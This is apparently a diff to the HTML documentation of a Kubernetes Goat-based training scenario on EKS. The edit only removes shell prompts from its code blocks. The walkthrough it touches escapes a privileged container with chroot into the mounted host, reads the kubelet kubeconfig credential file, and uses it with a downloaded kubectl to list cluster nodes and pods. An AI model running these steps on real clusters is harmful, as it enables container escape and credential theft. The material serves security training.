@@ -897,8 +897,8 @@
 <li>Running app: System Monitor</li>
 </ul>
 <p>Ensure to have the EKS Cluster including the Scenarios up and running:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$<span class="w"> </span>pgo<span class="w"> </span>--apply<span class="w"> </span>eks
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>$<span class="w"> </span>pgo<span class="w"> </span>--apply<span class="w"> </span>scenarios
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>pgo<span class="w"> </span>--apply<span class="w"> </span>eks
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>pgo<span class="w"> </span>--apply<span class="w"> </span>scenarios
 </code></pre></div>
 <h2 id="attribution">Attribution<a class="headerlink" href="#attribution" title="Permanent link">&para;</a></h2>
 <p>This scenario is based on <a href="https://madhuakula.com/kubernetes-goat/docs/">Kubernetes Goat</a> but adapted to work an Playground One and EKS.</p>
@@ -944,27 +944,27 @@ You can recon the system, some interesting places to obtain the node level confi
 
 After performing the analysis, you can identify that this container has full privileges of the host system and allows privilege escalation. As well as `/host-system` is mounted.
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>$<span class="w"> </span>capsh<span class="w"> </span>--print
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>capsh<span class="w"> </span>--print
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$<span class="w"> </span>mount
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>mount
 </code></pre></div>
 
 Now you can explore the mounted file system by navigating to the `/host-system` path
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$<span class="w"> </span>ls<span class="w"> </span>/host-system/
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>ls<span class="w"> </span>/host-system/
 </code></pre></div>
 
 You can gain access to the host system privileges using `chroot`.
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>$<span class="w"> </span>chroot<span class="w"> </span>/host-system<span class="w"> </span>bash
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>chroot<span class="w"> </span>/host-system<span class="w"> </span>bash
 </code></pre></div>
 
 As you can see, now you can access all the host system resources like docker containers, configurations, etc.
 
 Trying to use the docker client fails.
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>$<span class="w"> </span>docker<span class="w"> </span>ps
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>docker<span class="w"> </span>ps
 </code></pre></div>
 
 <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>bash: docker: command not found
@@ -972,7 +972,7 @@ Trying to use the docker client fails.
 
 This does not work, since we're on a Kubernetes optimized node OS with no docker provided.
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>$<span class="w"> </span>uname<span class="w"> </span>-a
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>uname<span class="w"> </span>-a
 </code></pre></div>
 
 <div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Linux system-monitor-6dfbdbb7d-w6mdv 5.10.184-175.749.amzn2.x86_64 #1 SMP Wed Jul 12 18:40:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
@@ -980,7 +980,7 @@ This does not work, since we're on a Kubernetes optimized node OS with no docker
 
 The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>$<span class="w"> </span>cat<span class="w"> </span>/var/lib/kubelet/kubeconfig
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>cat<span class="w"> </span>/var/lib/kubelet/kubeconfig
 </code></pre></div>
 
 <div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>apiVersion: v1
@@ -1012,7 +1012,7 @@ The Kubernetes node configuration can be found at the default path, which is use
 
 Sadly, there is no `kubectl` as well.
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>$<span class="w"> </span>kubectl
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>kubectl
 </code></pre></div>
 
 <div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>bash: kubectl: command not found
@@ -1020,14 +1020,14 @@ Sadly, there is no `kubectl` as well.
 
 Trying to use the package manager `yum` will not solve the problem. But navigating to https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux will help:
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>$<span class="w"> </span><span class="nb">cd</span>
-<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>$<span class="w"> </span>curl<span class="w"> </span>-LO<span class="w"> </span><span class="s2">&quot;https://dl.k8s.io/release/</span><span class="k">$(</span>curl<span class="w"> </span>-L<span class="w"> </span>-s<span class="w"> </span>https://dl.k8s.io/release/stable.txt<span class="k">)</span><span class="s2">/bin/linux/amd64/kubectl&quot;</span>
-<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>$<span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span>kubectl
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">cd</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>curl<span class="w"> </span>-LO<span class="w"> </span><span class="s2">&quot;https://dl.k8s.io/release/</span><span class="k">$(</span>curl<span class="w"> </span>-L<span class="w"> </span>-s<span class="w"> </span>https://dl.k8s.io/release/stable.txt<span class="k">)</span><span class="s2">/bin/linux/amd64/kubectl&quot;</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>chmod<span class="w"> </span>+x<span class="w"> </span>kubectl
 </code></pre></div>
 
 Try to get the available nodes of our cluster:
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>$<span class="w"> </span>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>nodes<span class="w"> </span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>nodes<span class="w"> </span>
 </code></pre></div>
 
 <div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>NAME                                            STATUS   ROLES    AGE   VERSION
@@ -1037,7 +1037,7 @@ Try to get the available nodes of our cluster:
 
 Can you do more?
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>$<span class="w"> </span>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>pods<span class="w"> </span>-A
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>pods<span class="w"> </span>-A
 </code></pre></div>
 
 <div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>NAMESPACE           NAME                                               READY   STATUS    RESTARTS   AGE
@@ -1066,7 +1066,7 @@ Can you do more?
 <a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a>victims             web-app-854bdf944f-ddqcs                           1/1     Running   0          53m
 </code></pre></div>
 
-<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>$<span class="w"> </span>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>nodes<span class="w"> </span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>./kubectl<span class="w"> </span>--kubeconfig<span class="w"> </span>/var/lib/kubelet/kubeconfig<span class="w"> </span>get<span class="w"> </span>nodes<span class="w"> </span>
 </code></pre></div>
 
 <div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>NAME                                            STATUS   ROLES    AGE   VERSION
